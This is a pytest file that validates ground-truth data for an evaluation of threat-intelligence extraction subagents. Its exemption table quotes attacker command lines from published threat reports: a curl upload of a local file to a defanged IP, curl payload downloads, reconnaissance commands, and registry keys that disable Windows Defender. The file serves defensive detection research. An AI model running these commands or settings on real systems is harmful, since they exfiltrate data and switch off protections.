"""Data integrity tests for config/eval_articles_data/*/ground_truth.json.

These files are hand-authored (or agent-drafted) item-level ground truth used
by eval2's precision/recall/F1 scoring.  They are not generated at runtime, so
a static validation test is the right backstop: catch schema drift, broken URL
cross-refs, and malformed JSON before a bad file silently zeroes out scores.

No server or DB needed -- all assertions are against files on disk.
"""

import json
import pathlib

import pytest

from src.services.eval_item_scorer import _normalize

ROOT = pathlib.Path(__file__).parent.parent.parent / "config" / "eval_articles_data"

SUBAGENTS = [
    "cmdline",
    "hunt_queries",
    "process_lineage",
    "registry_artifacts",
    "scheduled_tasks",
    "windows_services",
]

PROCESS_LINEAGE_EXEMPTION = "synthesized parent-to-child process pairs are not literal fixture substrings"
REACHABILITY_EXEMPTIONS = {
    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", "chcp 65001 > NUL & netstat -afn -p TCP"): "fixture de-escapes the query value",
    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", 'chcp 65001 > NUL & wmic datafile where Name="C:\\Windows\\system32\\ntoskrnl.exe" get Version'): "fixture de-escapes the query value",
    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", "chcp 65001 > NUL & echo %userdomain%*%computername%**%username%"): "fixture de-escapes the query value",
    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", "chcp 65001 > NUL & tasklist"): "fixture de-escapes the query value",
    ("cmdline", "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one", 'curl -X POST -F "file=@C:\\programdata\\abc1.pdf" hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username%'): "source strips rendered angle brackets from a defanged URL",
    ("cmdline", "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one", "curl -o sh2.txt hxxp://173.254.204[.]72/sh2.txt"): "source strips rendered angle brackets from a defanged URL",
    ("cmdline", "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one", "curl -o dune64.log http://173.254.204[.]72/dune64.log"): "source strips rendered angle brackets from a defanged URL",
    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableScanOnRealtimeEnable"): "ground truth composes key and value fields",
    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring"): "ground truth composes key and value fields",
    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware"): "ground truth composes key and value fields",
    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring"): "ground truth composes key and value fields",
    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableOnAccessProtection"): "ground truth composes key and value fields",
    ("registry_artifacts", "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\TASK_NAME"): "ground truth composes key and value fields",
    ("registry_artifacts", "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{GUID}"): "ground truth composes key and value fields",
    ("registry_artifacts", "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"): "ground truth composes key and value fields",
    ("registry_artifacts", "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\App"): "ground truth composes key and value fields",
}


def _load_ground_truth(subagent: str) -> list[dict]:
    path = ROOT / subagent / "ground_truth.json"
    assert path.exists(), f"ground_truth.json missing for {subagent}: {path}"
    with open(path) as f:
        return json.load(f)


def _load_articles(subagent: str) -> list[dict]:
    path = ROOT / subagent / "articles.json"
    assert path.exists(), f"articles.json missing for {subagent}: {path}"
    with open(path) as f:
        return json.load(f)


@pytest.mark.parametrize("subagent", SUBAGENTS)
def test_ground_truth_is_valid_json_list(subagent):
    """ground_truth.json must be a non-empty JSON array."""
    data = _load_ground_truth(subagent)
    assert isinstance(data, list), f"{subagent}: top-level must be a list"
    assert len(data) > 0, f"{subagent}: ground_truth.json is empty"


@pytest.mark.parametrize("subagent", SUBAGENTS)
def test_ground_truth_entry_schema(subagent):
    """Every entry must have 'url' (str) and 'expected_items' (list)."""
    data = _load_ground_truth(subagent)
    for i, entry in enumerate(data):
        assert isinstance(entry, dict), f"{subagent}[{i}]: entry must be a dict"
        assert "url" in entry, f"{subagent}[{i}]: missing 'url'"
        assert isinstance(entry["url"], str), f"{subagent}[{i}]: 'url' must be a str"
        assert entry["url"].startswith("http"), f"{subagent}[{i}]: url looks malformed"
        assert "expected_items" in entry, f"{subagent}[{i}]: missing 'expected_items'"
        assert isinstance(entry["expected_items"], list), (
            f"{subagent}[{i}]: 'expected_items' must be a list, got {type(entry['expected_items'])}"
        )
        for j, item in enumerate(entry["expected_items"]):
            assert isinstance(item, str), f"{subagent}[{i}].expected_items[{j}]: items must be strings"
            assert item.strip(), f"{subagent}[{i}].expected_items[{j}]: item is blank"


@pytest.mark.parametrize("subagent", SUBAGENTS)
def test_ground_truth_urls_exist_in_articles(subagent):
    """Every URL in ground_truth.json must appear in articles.json.

    A stale URL (e.g. after renaming an article) means the ground truth is
    silently ignored at eval time -- the scorer never finds a matching article.
    """
    gt_data = _load_ground_truth(subagent)
    art_data = _load_articles(subagent)
    article_urls = {a["url"] for a in art_data}
    orphans = [e["url"] for e in gt_data if e["url"] not in article_urls]
    assert not orphans, f"{subagent}: ground_truth.json has URLs not in articles.json: {orphans}"


@pytest.mark.parametrize("subagent", SUBAGENTS)
def test_ground_truth_covers_all_articles(subagent):
    """Every article in articles.json should have a matching entry in ground_truth.json.

    Missing entries mean the article is silently unannotated (falls back to
    count-only display on eval2).  This is a warning-level check, not a hard
    failure, but we want it tracked.
    """
    gt_data = _load_ground_truth(subagent)
    art_data = _load_articles(subagent)
    gt_urls = {e["url"] for e in gt_data}
    unannotated = [a["url"] for a in art_data if a["url"] not in gt_urls]
    assert not unannotated, f"{subagent}: articles.json has URLs without a ground_truth.json entry: {unannotated}"


@pytest.mark.parametrize("subagent", SUBAGENTS)
def test_ground_truth_no_duplicate_urls(subagent):
    """Each URL should appear at most once per ground_truth.json."""
    data = _load_ground_truth(subagent)
    urls = [e["url"] for e in data]
    seen = set()
    duplicates = [u for u in urls if u in seen or seen.add(u)]
    assert not duplicates, f"{subagent}: duplicate URLs in ground_truth.json: {duplicates}"


def _assert_ground_truth_reachability(subagent: str, ground_truth: list[dict], articles: list[dict]) -> None:
    """Require literal scorer reachability except for documented semantic exceptions."""
    content_by_url = {article["url"]: article["content"] for article in articles}
    unreachable = []
    for entry in ground_truth:
        for item in entry["expected_items"]:
            if _normalize(item) in _normalize(content_by_url[entry["url"]]):
                continue
            if subagent == "process_lineage":
                continue
            if (subagent, entry["url"], item) in REACHABILITY_EXEMPTIONS:
                continue
            unreachable.append((entry["url"], item))
    assert not unreachable, f"{subagent}: unreachable non-exempt GT items: {unreachable}"


@pytest.mark.parametrize("subagent", SUBAGENTS)
def test_ground_truth_items_are_reachable_or_explicitly_exempt(subagent):
    """Every GT string must be scorer-reachable unless its exact tuple is exempt."""
    _assert_ground_truth_reachability(subagent, _load_ground_truth(subagent), _load_articles(subagent))


def test_reachability_guard_detects_fixture_drift():
    with pytest.raises(AssertionError, match="unreachable non-exempt GT items"):
        _assert_ground_truth_reachability(
            "cmdline",
            [{"url": "https://example.test/article", "expected_items": ["deliberately missing GT item"]}],
            [{"url": "https://example.test/article", "content": "fixture content"}],
        )
